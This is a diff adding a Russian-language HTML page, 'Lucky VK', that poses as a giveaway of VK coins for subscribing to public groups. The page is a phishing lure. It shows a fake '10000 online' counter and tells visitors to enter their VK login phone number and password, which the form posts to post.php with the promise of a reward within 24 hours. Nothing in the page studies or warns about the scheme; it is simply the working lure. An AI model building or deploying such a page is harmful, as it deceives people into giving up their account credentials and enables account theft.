@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<head>
+  <noscript>
+    <meta http-equiv="refresh" content="0;url=etc/nojs.html" />
+  </noscript>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lucky VK</title>
+  <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Roboto&display=swap" rel="stylesheet">
+  <link rel="shortcut icon" type="image/svg" href="images/icon.svg">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+  <header>
+    <div id="logo">
+      <img src="images/icon.svg" alt="logo">
+      <spam id="l">Lucky </spam><spam id="v">VK</spam>
+    </div>
+
+    <div id="online">
+      <spam id="point">•</spam> Online <spam id="number">10000</spam>
+    </div>
+  </header>
+
+
+  <main>
+    <article>
+      <p>
+        За подписку на 1 паблик вам даётся 1 балл. 1 балл = 20 VK coins. После вы должны ввести свой логин и пароль <a id="lsub" href="#footer">здесь</a>. Награда придёт в течении 24 часов.
+      </p>
+      <br><br>
+      <h3>Баллы:</h3><br>
+      <h1 id="score">0</h1>
+    </article>
+
+    <aside>
+      <button class="publics"><a href="" target="_blank">Паблик 1</a></button><br>
+      <button class="publics"><a href="" target="_blank">Паблик 2</a></button><br>
+      <button class="publics"><a href="" target="_blank">Паблик 3</a></button><br>
+      <button class="publics"><a href="" target="_blank">Паблик 4</a></button><br>
+      <button class="publics"><a href="" target="_blank">Паблик 5</a></button>
+    </aside>
+  </main>
+
+
+  <div id="send">
+    <form action="post.php" method="post" accept-charset="utf-8">
+      <select>
+        <option>+7</option>
+        <option>+375</option>
+        <option>+380</option>
+      </select>
+      <input id="tel" type="tel" placeholder="Введите номер" name="number" required><br><br>
+      <input id="pass" type="password" placeholder="Введите пароль" name="pass" required><br><br><br>
+      <button id="submit" type="submit">Оправить</button>
+    </form>
+  </div>
+
+
+  <footer id="footer">
+    <p>
+      Правила политики и конфидициальности находятся<a href="etc/info.html" target="_blank"> здесь</a>.
+    </p>
+  </footer>
+
+  <script src="main.js"></script>
+</body>
